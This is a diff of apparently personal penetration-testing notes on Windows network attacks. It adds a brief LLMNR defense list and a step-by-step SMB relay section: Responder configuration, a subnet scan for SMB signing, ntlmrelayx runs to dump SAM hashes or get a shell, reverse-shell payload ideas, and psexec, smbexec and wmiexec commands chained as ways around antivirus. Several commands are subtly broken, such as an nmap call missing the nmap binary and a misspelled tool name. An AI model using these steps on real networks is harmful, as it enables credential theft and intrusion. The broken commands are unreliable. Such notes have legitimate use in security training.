@@ -95,10 +95,50 @@ $ hashcat --help | grep SHA
 
 
 ## LLMNR Poisoning Defense:
+1. Disable LLMNR
+2. Disable NBT-NS
+3. Require Network Access Control
+4. Require strong passwords (phrases) more than 14 characters
 
 
-## SMB attacks: 
+## SMB attacks: How do I get Victim to try connecting to attack machine SMB??
+edit: /usr/share/responder/Responder.conf
+```
+SMB = Off
+HTTP = Off
+```
+***everything else stays on
 
+### NMAP
+check for open SMB port and check for SMB signing
+```
+sudo --script=smb2-security-mode.nse -p445 192.168.1.0/24
+```
+look for smb2 enabled but not required (default for desktops)
+
+### ntmlrelayx.py
+1. installed with impacket
+2. run while responder is running
+```
+ntmlrelayx.py -tf targets.txt -smb2support -i
+```
+
+```
+-i interact
+-e example.exe: execute example.exe
+-c ls: run command ls
+```
+looking for it to dump SAM hashes or give you and SMB client shell for the known user. can use MSFvenom to create an executable payload and get reverse shell. or create a powershell script or CMD to run as a command to get a reverse shell or do something. 
+
+### connecting: requires having cracked a hash
+1. can use MSFconsole to attack the tartget using exploit/windows/smb/psexec
+2. if that is getting stopped by antivirus try psexec.py 
+``` psexec.py <domain>.local/<user>:<password>@<ip-address> ```
+3. if that is getting stopped by antivirus try smbexec.py 
+``` smbexec.py <domain>.local/<user>:<password>@<ip-address> ```
+4. if that is getting stopped by antivirus try wmiexec.py 
+``` wmiexec.py <domain>.local/<user>:<password>@<ip-address> ```
+5. there is also a powershell version of psexec and other options that might be able to do the same thing. 
 
 ## IPv6: mitm6
 
@@ -110,8 +150,8 @@ $ hashcat --help | grep SHA
 
 
 ## Domain Enumeration: 
-# Powerview:
-# Bloodhound: 
+### Powerview: 
+### Bloodhound: 
 
 
 ## Pass the hash: 
